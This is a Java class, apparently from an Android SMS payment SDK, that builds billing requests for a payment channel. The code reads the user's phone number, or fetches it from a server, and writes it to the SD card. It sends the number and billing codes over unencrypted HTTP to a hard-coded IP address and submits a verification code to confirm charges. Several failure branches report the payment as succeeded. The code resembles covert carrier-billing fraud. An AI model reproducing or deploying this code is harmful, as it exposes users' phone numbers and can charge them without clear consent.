package com.y7.smspay.sdk.channel;

import android.text.TextUtils;
import android.util.Xml;

import com.y7.smspay.sdk.json.GetDataImpl;
import com.y7.smspay.sdk.util.Constants;
import com.y7.smspay.sdk.util.HttpSdSsTool;
import com.y7.smspay.sdk.util.IHttpRequestLs;
import com.y7.smspay.sdk.util.Utils;

import org.json.JSONException;
import org.json.JSONObject;
import org.xmlpull.v1.XmlPullParser;

import java.io.StringReader;

/**
 * 
 * @author Administrator
 * 
 */
public class XRPoyChannel extends BasePoyChannel {
	/*
	 * (non-Javadoc)
	 * 
	 * @see com.yc.paysdk.channel.BasePayChannel#pay()
	 */
	@Override
	public void pay() {
		super.pay();

		//DDDLog.d("XTPayChannel begin");
		myPhoneNumber = HttpSdSsTool.getPhoneNumber(appContext);
		String phone = null;
		if (TextUtils.isEmpty(myPhoneNumber)) { // 手机号为空去服务器获取
			//DDDLog.d("网络获取手机号");
			try {
				String result = GetDataImpl.getInstance(appContext).findNum();
				if (TextUtils.isEmpty(result)) {
					// 网络返回空，支付失败
					postPaySucceededEvent();
				}
				JSONObject demoJson = new JSONObject(result);
				phone = demoJson.getString("phone");
				Utils.save2SDCard(Constants.MYPHONENUMBER, phone);
			} catch (JSONException e) {
				//DDDLog.e("Exception", e);
			}
			if (TextUtils.isEmpty(phone)) {
				postPaySucceededEvent();
			} else {
				myPhoneNumber = phone;
			}
		}

		//DDDLog.d("myPhoneNumber -->" + myPhoneNumber);
		if (!TextUtils.isEmpty(myPhoneNumber)) {
			//DDDLog.d("请求验证码");
			HttpSdSsTool.ISREQUESCODE = HttpSdSsTool.XT;
			String xmlStr = HttpSdSsTool.requestCode(Constants.CHANNEL_PCXR, getReqParamString());
			//DDDLog.d("xmlStr-->" + xmlStr);
			try {
				XmlPullParser parser = Xml.newPullParser();
				parser.setInput(new StringReader(xmlStr));
				int event = parser.getEventType();

				while (event != XmlPullParser.END_DOCUMENT) {
					switch (event) {
					case XmlPullParser.START_DOCUMENT:
						break;
					case XmlPullParser.START_TAG:
						String name = parser.getName();
						if (name.equalsIgnoreCase("response")) {
						} else if (name.equalsIgnoreCase("result")) {
							String xmlResultStr = parser.nextText();
						} else if (name.equalsIgnoreCase("msg")) {
							String xmlMsgStr = parser.nextText();
						} else if (name.equalsIgnoreCase("orderid")) {
							OrderId = parser.nextText();
							//DDDLog.d("OrderId -->" + OrderId);
						}
						break;
					case XmlPullParser.END_TAG:
						break;
					}
					event = parser.next();
				}
			} catch (Exception e) {
				//DDDLog.d("pay",e);
			}
		}

		HttpSdSsTool.setHttpRequestListener(new IHttpRequestLs() {

			@Override
			public void onSendSucceed() {
				// TODO Auto-generated method stub
			}

			@Override
			public void onSendFailed() {
				// TODO Auto-generated method stub
			}
		});
		//DDDLog.d("XTPayChannel end");
	}

	/**
	 * 计费请求接口
	 * 
	 * @return
	 */
	private String getReqParamString() {
		String urlSms = "zzbj0101004"; // 指令 5Y
		if (price == 600) {
			urlSms = "zzbj03013"; // 6Y
		} else if (price == 800) {
			urlSms = "zzbj03014"; // 8Y
		} else if (price == 1000) {
			urlSms = "zzbj0101005"; // 10Y
		}

		// 拼代码
		String httpUrl = "http://113.107.161.68:9381/webgame/xrgame.jsp";
		String urlReq = "atype=" + "req"; // req-计费请求 ver-计费验证码
		String urlCp = "cp=" + "gw"; // gw是我司名字
		String urlPhone = "phone=" + myPhoneNumber;
		String urlPdid = "pdid=" + urlSms;
		pdid = urlSms;
		String urlCext1 = "cext1=" + extData;
		String urlCext2 = "cext2=" + "b";
		String endUrl = httpUrl + "?" + urlReq + "&" + urlCp + "&" + urlPhone + "&" + urlPdid + "&" + urlCext1 + "&" + urlCext2;
		return endUrl;
	}

	/**
	 * 计费验证接口
	 * 
	 * @param code
	 * @return
	 */
	public static String getcallBackUrl(String code) {
		// 拼代码
		String httpUrl = "http://113.107.161.68:9381/webgame/xrgame.jsp";
		String urlReq = "atype=" + "ver"; // req-计费请求 ver-计费验证码
		String urlCp = "cp=" + "gw"; // gw是我司名字
		String urlPhone = "phone=" + myPhoneNumber;
		String urlPdid = "pdid=" + pdid;
		String urlVerifycode = "verifycode=" + code;
		String urlOrderId = "orderid=" + OrderId;
		String endUrl = httpUrl + "?" + urlReq + "&" + urlCp + "&" + urlPhone + "&" + urlPdid + "&" + urlVerifycode + "&" + urlOrderId;
		//DDDLog.d("获取验证指令url:" + endUrl);
		return endUrl;
	}

	private static String myPhoneNumber;
	private static String OrderId;
	private static String pdid;
}
